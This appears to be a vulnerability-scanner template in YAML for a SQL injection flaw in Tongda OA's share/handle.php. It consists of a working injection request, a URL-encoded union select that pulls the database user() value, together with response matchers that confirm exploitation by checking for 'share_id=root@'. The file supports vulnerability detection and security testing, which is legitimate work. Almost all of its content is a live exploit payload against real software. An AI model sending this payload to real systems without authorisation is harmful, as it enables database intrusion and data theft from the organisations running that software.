id: poc-yaml-tongda-oa-handle-php-sqli
info:
  name: Tongda OA handle.php SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - method: GET
    path:
      - "{{BaseURL}}/share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20user()--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"status":"1"'
      - type: word
        part: body
        words:
          - "share_id=root@"
